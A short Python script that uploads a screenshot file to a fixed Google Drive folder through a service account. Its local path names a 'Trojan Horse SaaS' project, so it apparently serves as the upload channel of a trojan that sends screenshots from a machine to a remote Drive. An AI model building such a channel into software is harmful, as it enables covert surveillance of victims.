import os
from googleapiclient.discovery import build
from oauth2client.service_account import ServiceAccountCredentials

from google_auth_oauthlib.flow import Flow, InstalledAppFlow
from googleapiclient.http import MediaFileUpload, MediaIoBaseDownload
from google.auth.transport.requests import Request


##################################################
class GoogleDriveService:
    def __init__(self):
        self._SCOPES=['https://www.googleapis.com/auth/drive']

        _base_path = os.path.dirname(__file__)
        _credential_path=os.path.join(_base_path, 'credential.json')
        os.environ["GOOGLE_APPLICATION_CREDENTIALS"] = _credential_path

    def build(self):
        creds = ServiceAccountCredentials.from_json_keyfile_name(os.getenv("GOOGLE_APPLICATION_CREDENTIALS"), self._SCOPES)
        service = build('drive', 'v3', credentials=creds)

        return service
##################################################


service = GoogleDriveService().build()

file_names = ['screenshot.png']
mime_types = ['image/png']

VM_PATH = '/Users/kajenthavaraj/Trojan Horse SaaS'
#VM_PATH = input("What is the VM Path: ")
#VM_PATH = "kajenthavaraj@{0}".format(VM_NAME)  - VM_NAME = instance-1

file_name = file_names[0]
mime_type = mime_types[0]

file_path = '{0}/{1}'.format(VM_PATH, file_name)
print(file_path)


##################################################

def file_upload(service, file_path, mime_type):
    #for file_name, mime_type in zip(file_names, mime_types):
    folder_id = '1iJszGHPp1NXtpjtJwDHaayRck418RmnK'
    file_metadata = {
        'name': file_name,
        'parents': [folder_id]
    }

    media = MediaFileUpload(file_path, mimetype = mime_type)

    service.files().create(
        body=file_metadata,
        media_body=media,
        fields='id'
    ).execute()


file_upload(service, file_path, mime_type)